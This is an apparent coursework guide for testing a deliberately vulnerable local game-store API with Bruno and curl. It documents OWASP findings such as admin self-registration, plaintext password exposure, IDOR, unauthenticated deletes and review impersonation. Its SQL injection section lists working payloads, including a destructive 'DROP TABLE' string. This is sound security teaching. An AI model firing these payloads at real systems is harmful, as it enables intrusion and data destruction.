# API Testing Guide — Bruno

**Tool:** Bruno (free, open-source API client)
**Download:** `brew install --cask bruno` or https://www.usebruno.com
**Backend URL:** `http://localhost:3001`
**Start server:** `pnpm --prefix Assignment/BackEndServer start` (from repo root)

---

## Setup in Bruno

1. Open **Bruno** from `/Applications/`
2. Click **New Collection** → name it `Turbo Funicular`
3. Click **New Request** for each test below
4. Set the method (GET/POST/DELETE) and paste the full URL
5. For **POST requests**: go to the **Body** tab, select **JSON**, paste the body
6. Click the blue **Send** button
7. The response panel shows: status code (top), headers, and body (bottom)

---

## 1. Health Check — Verify Server is Running

### Test 1: GET /game

**Purpose:** Confirm the backend server is up and the database is connected. This is the quickest way to check everything is working.

**Steps:**
1. Click **New Request** → name it `Health Check`
2. Method: `GET`
3. URL: `http://localhost:3001/game`
4. Click **Send**

**Expected Result:**
- Status: `200 OK`
- Body: a JSON array of 3 games — Cyberpunk 2077, LEGO Star Wars: The Skywalker Saga, Hogwarts Legacy

**What to screenshot:** The full Bruno window showing the GET request, the `200` status, and the game list in the response body.

**What it proves:** The API server and database are running correctly. All other tests depend on this working.

**curl alternative:**
```bash
curl -s http://localhost:3001/game | json_pp
```

---

## 2. Public Read Endpoints (No Auth Required — Intended)

These endpoints are meant to be public. They work correctly and have no security issues.

### Test 2: GET /category

**Purpose:** List all game categories.

**URL:** `http://localhost:3001/category`

**Expected:**
- Status: `200 OK`
- Body: 7 categories (Action, RPG, MMO, FPS, Fantasy, Open World, Fighting)

### Test 3: GET /platform

**Purpose:** List all gaming platforms.

**URL:** `http://localhost:3001/platform`

**Expected:**
- Status: `200 OK`
- Body: 5 platforms (PS5, PC, Xbox, Switch, Mobile)

### Test 4: GET /game/12

**Purpose:** Get details of a specific game by its ID.

**URL:** `http://localhost:3001/game/12`

**Expected:**
- Status: `200 OK`
- Body: Cyberpunk 2077 details including title, description, year, and game_image (base64 blob)

**Try different IDs:** `13` = LEGO Star Wars, `14` = Hogwarts Legacy

### Test 5: GET /game/12/review

**Purpose:** Get all reviews for a specific game.

**URL:** `http://localhost:3001/game/12/review`

**Expected:**
- Status: `200 OK`
- Body: 2 reviews for Cyberpunk 2077 — one from user 3 (rating 4) and one from user 1 (rating 3)

### Test 6: POST /searchgame

**Purpose:** Search for games by title, platform, and/or category.

**URL:** `http://localhost:3001/searchgame`
**Body (JSON):**
```json
{ "input": "Cyber", "platID": "", "catID": "" }
```

**Expected:**
- Status: `200 OK`
- Body: Game(s) matching "Cyber" in their title

**Try other searches:**
```json
{ "input": "", "platID": "1", "catID": "" }
{ "input": "", "platID": "", "catID": "2" }
```

---

## 3. Authentication & Registration

### Test 7: Register a New User

**Purpose:** Create a normal customer account.

**URL:** `http://localhost:3001/users`
**Body (JSON):**
```json
{
  "username": "testuser",
  "email": "test@test.com",
  "password": "test123",
  "type": "Customer",
  "profile_pic_url": ""
}
```

**Expected:**
- Status: `201 Created`
- Body: `{ "userid": 10 }` (or whatever the next ID is)

**What to screenshot:** The POST request, the `201` status, and the response body with the new user ID.

### Test 8: Register as Admin (Vulnerability — A01, A04)

**Purpose:** Prove that anyone can register as an admin by simply changing the `type` field. The server trusts the client-supplied role instead of assigning it based on logic.

**URL:** `http://localhost:3001/users`
**Body (JSON):**
```json
{
  "username": "hacker",
  "email": "hacker@x.com",
  "password": "hack123",
  "type": "admin",
  "profile_pic_url": ""
}
```

**Expected:**
- Status: `201 Created`
- Body: `{ "userid": 11 }`

**Why this is a vulnerability (A01: Broken Access Control / A04: Insecure Design):** The `type` field should be set server-side (default to `"Customer"`) and never accepted from the client. An attacker can create an admin account and gain full system access. The admin panel is enforced only via client-side JavaScript (`checkAdmin()`), which is trivially bypassed.

**What to screenshot:** The POST request body showing `"type": "admin"`, the `201` status, then in a separate test login as this user and access `/CheckRole` to confirm the role is `"admin"`.

### Test 9: Login

**Purpose:** Authenticate and receive a JWT token for authorised requests.

**URL:** `http://localhost:3001/users/login`
**Body (JSON):**
```json
{
  "email": "terry@gmail.com",
  "password": "abc123"
}
```

**Expected:**
- Status: `200 OK`
- Body: `{ "success": true, "token": "eyJhbGciOiJIUzI1NiIs..." }`

**How to use the token:** Copy the token string (without quotes). You'll use it in the `Authorization` header for Test 10.

**What to screenshot:** The login request, `200` status, and the response showing the token.

### Test 10: Check Role (The Only Endpoint with Auth)

**Purpose:** Demonstrate that `/CheckRole` is the **only** endpoint that verifies the JWT token. All other protected operations (delete, create, update) have no auth check.

**URL:** `http://localhost:3001/CheckRole`
**Headers:**
```
Authorization: Bearer YOUR_TOKEN_HERE
```

**Expected:**
- Status: `200 OK`
- Body: `{ "role": "Customer" }` (or `"admin"` if you logged in as an admin user)

**Without the token:** Remove the Authorization header and send again → `403 Not authorized`

**Why this matters:** This endpoint proves the JWT auth middleware works, yet it's only applied to this one route. Every other sensitive endpoint (delete game, add game, add category, etc.) has **no auth check at all**.

**What to screenshot:** Two screenshots — one with a valid token showing `200` + role, and one without the header showing `403`.

---

## 4. Broken Access Control (A01)

These tests demonstrate that the API fails to enforce access control on sensitive operations.

### Test 11: GET /users — Expose All Users (No Auth, Plaintext Passwords)

**Purpose:** Prove that anyone (no login required) can retrieve all user records, including passwords stored in plain text.

**URL:** `http://localhost:3001/users`

**Expected:**
- Status: `200 OK`
- Body: A JSON array of all users, each containing: `userid`, `username`, `email`, `password`, `type`, `profile_pic_url`, `created_at`
- The `password` field is visible in plain text (e.g., `"abc123"`)

**Why this is a vulnerability (A01: Broken Access Control + A07: Authentication Failures):**
1. **No authentication required** — the endpoint has no JWT check
2. **IDOR** — every user's data is exposed in a single request
3. **Plaintext passwords** — violates OWASP A07 (passwords should be hashed with bcrypt/argon2)

**What to screenshot:** The entire response showing all users with their passwords visible.

**curl:**
```bash
curl -s http://localhost:3001/users | json_pp
```

### Test 12: GET /users/:userid — IDOR (Insecure Direct Object Reference)

**Purpose:** Prove that you can view any user's details (including their password) just by changing the numeric ID in the URL.

**URL:** `http://localhost:3001/users/1`

**Expected:**
- Status: `200 OK`
- Body: Terry Tan's full record including `"password": "abc123"`

**Try other IDs:**
- `http://localhost:3001/users/2` → another user
- `http://localhost:3001/users/3` → another user
- `http://localhost:3001/users/99` → might return empty or error

**Why this is a vulnerability (A01: Broken Access Control — IDOR):** The user ID is taken directly from the URL path with no authentication check. An attacker can enumerate user IDs to access any account. Even if auth were added, there's no check that the requester is allowed to view that user's data.

**What to screenshot:** The request, `200` status, and response showing password for user ID 1.

### Test 13: DELETE /game/:id — Delete a Game (No Auth)

**Purpose:** Prove that anyone can delete any game without logging in.

**URL:** `http://localhost:3001/game/14`

**Expected:**
- Status: `204 No Content` (empty body)
- The game with ID 14 (Hogwarts Legacy) is now deleted

**Verify the deletion:** Send `GET http://localhost:3001/game/14` → should return empty or `null`

**⚠️ Important:** This deletes data permanently. To restore, re-import the SQL dump:
```bash
mysql -u nr -p sp_games < spgames_SC.sql
```

**Why this is a vulnerability (A01: Broken Access Control):** The `DELETE` route has zero authentication or authorisation checks. Any unauthenticated attacker can destroy data.

**What to screenshot:** The DELETE request showing `204`, then the subsequent GET showing the game is gone.

### Test 14: POST /users/:uid/game/:gid/review — Impersonate Another User

**Purpose:** Prove that you can post a review as any user, because the user ID comes from the URL, not from the JWT token.

**URL:** `http://localhost:3001/users/1/game/12/review`
**Body (JSON):**
```json
{
  "content": "This review was posted by someone else!",
  "rating": 5
}
```

**Expected:**
- Status: `201 Created`
- Body: `{ "reviewID": 14 }` (or next available ID)

**Verify:** Send `GET http://localhost:3001/game/12/review` and see the review attributed to user ID 1.

**Why this is a vulnerability (A01: Broken Access Control):** The user ID in the URL path (`:uid`) determines who the review is attributed to — not the JWT token. An attacker can post reviews as any user, including admins. The JWT middleware is not even applied to this route, so no token is needed at all.

**What to screenshot:** The POST request, `201` status, and then the GET /game/12/review showing the impersonated review.

### Test 15: POST /game — Add a Game (No Auth)

**Purpose:** Prove that anyone can add a new game without being an admin or logging in.

**URL:** `http://localhost:3001/game`
**Headers:** `Content-Type: multipart/form-data` (Bruno handles this when you switch to **Multipart Form** in the Body tab)
**Body (Multipart Form):**

| Field | Value |
|-------|-------|
| `title` | `Test Game` |
| `game_description` | `This is a game added without authentication` |
| `year` | `2026` |
| `price` | `10` |
| `platformid` | `1` |
| `categoryid` | `1` |

**Note:** This endpoint expects `multipart/form-data` because it handles image uploads (via multer). The `game_image` field is optional — if omitted, the game may still be created.

**Why this is a vulnerability (A01: Broken Access Control):** Only admins should be able to add games, but the route has no role check at all. The frontend hides the "Add Game" button from non-admins using JavaScript, but the backend doesn't enforce it.

**What to screenshot:** The multipart form fields, the `201` status, and the response.

### Test 16: POST /category — Add a Category (No Auth)

**Purpose:** Prove that anyone can add a category without admin privileges.

**URL:** `http://localhost:3001/category`
**Body (JSON):**
```json
{
  "catname": "TestCat",
  "cat_description": "This category was added without auth"
}
```

**Expected:**
- Status: `201 Created`
- Body: `{ "catID": 14 }` (or next available ID)

**Verify:** `GET http://localhost:3001/category` should show the new category.

**Why this is a vulnerability (A01):** Same issue — no role check on the backend.

### Test 17: POST /platform — Add a Platform (No Auth)

**Purpose:** Prove that anyone can add a platform without admin privileges.

**URL:** `http://localhost:3001/platform`
**Body (JSON):**
```json
{
  "platform_name": "TestPlatform",
  "platform_description": "This platform was added without auth"
}
```

**Expected:**
- Status: `201 Created`
- Body: `{ "platID": 15 }` (or next available ID)

**Verify:** `GET http://localhost:3001/platform` should show the new platform.

**Why this is a vulnerability (A01):** Same issue.

---

## 5. SQL Injection (A03)

### Test 18: SQLi via userid Parameter

**Purpose:** Prove that the `/users/:userid` endpoint is vulnerable to SQL injection because it interpolates the userid directly into the SQL query string without parameterisation.

**URL:** `http://localhost:3001/users/1 OR 1=1`

**Expected:**
- Status: `200 OK`
- Body: May return **all users** instead of just user 1, because the SQL becomes:
  ```sql
  SELECT * FROM users WHERE userid = 1 OR 1=1
  ```
  Since `1=1` is always true, this returns every row in the `users` table.

**Why this is a vulnerability (A03: Injection):** In `model/users.js:101`, the userid is embedded directly into the query string using `${userid}` (template literal), which means unsanitised input becomes part of the SQL command. An attacker can:
- Extract all data from any table
- Bypass authentication
- Potentially modify or delete data

**Other SQLi payloads to try:**
| URL | What it does |
|-----|-------------|
| `http://localhost:3001/users/1 UNION SELECT 1,2,3,4,5,6,7` | Union injection — probe column count |
| `http://localhost:3001/users/1 AND 1=2` | Returns empty (blind SQLi confirmation) |
| `http://localhost:3001/users/1; DROP TABLE users --` | Malicious — would delete the users table |

**What to screenshot:** The URL with the injection payload, the `200` status, and the response body showing all users returned instead of just one.

---

## 6. Summary of All Endpoints

| # | Method | Endpoint | Auth Required? | Vulnerable | OWASP |
|---|--------|----------|:---:|:---:|:---:|
| 1 | GET | `/game` | ❌ No | No | — |
| 2 | GET | `/category` | ❌ No | No | — |
| 3 | GET | `/platform` | ❌ No | No | — |
| 4 | GET | `/game/:id` | ❌ No | No | — |
| 5 | GET | `/game/:id/review` | ❌ No | No | — |
| 6 | POST | `/searchgame` | ❌ No | No | — |
| 7 | POST | `/users` (register) | ❌ No | **Yes** — client-supplied role | A01, A04 |
| 8 | POST | `/users` (register as admin) | ❌ No | **Yes** — privilege escalation | A01, A04 |
| 9 | POST | `/users/login` | ❌ No | No | — |
| 10 | GET | `/CheckRole` | ✅ Yes | No (only properly secured one) | — |
| 11 | GET | `/users` | ❌ No | **Yes** — IDOR, no auth, plaintext passwords | A01, A07 |
| 12 | GET | `/users/:userid` | ❌ No | **Yes** — IDOR, SQLi, plaintext passwords | A01, A03, A07 |
| 13 | DELETE | `/game/:id` | ❌ No | **Yes** — no auth at all | A01 |
| 14 | POST | `/users/:uid/game/:gid/review` | ❌ No | **Yes** — no ownership check | A01 |
| 15 | POST | `/game` | ❌ No | **Yes** — no role check | A01 |
| 16 | POST | `/category` | ❌ No | **Yes** — no role check | A01 |
| 17 | POST | `/platform` | ❌ No | **Yes** — no role check | A01 |
| 18 | GET | `/users/:userid` (SQLi) | ❌ No | **Yes** — SQL injection | A03 |

---

## 7. What to Screenshot (for Your Report)

For each test, Bruno shows everything in one window. Capture:

1. **The full Bruno window** showing:
   - Request method + URL at the top
   - Request body (for POST requests) in the Body tab
   - Response status code (e.g., `200 OK`, `201 Created`, `204 No Content`)
   - Response body showing the data

2. **Minimum screenshots per test:**

| Test | What to capture |
|------|----------------|
| 1 (GET /game) | URL + `200` + game list |
| 2-5 (public) | URL + `200` + response data |
| 6 (search) | URL + JSON body + `200` + results |
| 7 (register) | POST body + `201` + userid response |
| 8 (admin register) | POST body showing `"type": "admin"` + `201` |
| 9 (login) | POST body + `200` + token |
| 10 (CheckRole) | Header + `200` + role (with and without token) |
| 11 (expose users) | URL + `200` + all users + **passwords circled/highlighted** |
| 12 (IDOR) | URL `/users/1` + `200` + password visible |
| 13 (delete game) | DELETE URL + `204`, then GET /game/14 showing empty result |
| 14 (impersonate) | POST URL with user 1 + `201`, then GET showing the review |
| 15 (add game) | Multipart form + `201` |
| 16 (add category) | JSON body + `201` |
| 17 (add platform) | JSON body + `201` |
| 18 (SQLi) | URL with `1 OR 1=1` + `200` + all users returned |

**Tip:** You can highlight or annotate the screenshots afterward (circle the password fields, the role field, the injection payload, etc.).

---

## 8. Restoring Deleted Data

If you delete a game (Test 13) or mess up the database, re-import the original data:
```bash
mysql -u nr -p sp_games < spgames_SC.sql
```

---

## 9. curl Alternatives (No Bruno Required)

If you prefer the terminal, here are all tests as curl commands:

```bash
# Test 1: Health check
curl http://localhost:3001/game

# Test 2: Categories
curl http://localhost:3001/category

# Test 3: Platforms
curl http://localhost:3001/platform

# Test 4: Game by ID
curl http://localhost:3001/game/12

# Test 5: Game reviews
curl http://localhost:3001/game/12/review

# Test 6: Search
curl -X POST http://localhost:3001/searchgame -H "Content-Type: application/json" -d '{"input":"Cyber","platID":"","catID":""}'

# Test 7: Register
curl -X POST http://localhost:3001/users -H "Content-Type: application/json" -d '{"username":"testuser","email":"test@test.com","password":"test123","type":"Customer","profile_pic_url":""}'

# Test 8: Register as admin
curl -X POST http://localhost:3001/users -H "Content-Type: application/json" -d '{"username":"hacker","email":"hacker@x.com","password":"hack123","type":"admin","profile_pic_url":""}'

# Test 9: Login
curl -X POST http://localhost:3001/users/login -H "Content-Type: application/json" -d '{"email":"terry@gmail.com","password":"abc123"}'

# Test 10: Check role (replace TOKEN)
curl http://localhost:3001/CheckRole -H "Authorization: Bearer TOKEN"

# Test 11: Expose all users
curl http://localhost:3001/users

# Test 12: IDOR
curl http://localhost:3001/users/1

# Test 13: Delete game
curl -X DELETE http://localhost:3001/game/14

# Test 14: Impersonate review
curl -X POST http://localhost:3001/users/1/game/12/review -H "Content-Type: application/json" -d '{"content":"Hacked!","rating":1}'

# Test 15: Add game (multipart)
curl -X POST http://localhost:3001/game -F "title=Test Game" -F "game_description=Test" -F "year=2026" -F "price=10" -F "platformid=1" -F "categoryid=1"

# Test 16: Add category
curl -X POST http://localhost:3001/category -H "Content-Type: application/json" -d '{"catname":"TestCat","cat_description":"test"}'

# Test 17: Add platform
curl -X POST http://localhost:3001/platform -H "Content-Type: application/json" -d '{"platform_name":"TestPlatform","platform_description":"test"}'

# Test 18: SQL injection
curl "http://localhost:3001/users/1 OR 1=1"
```
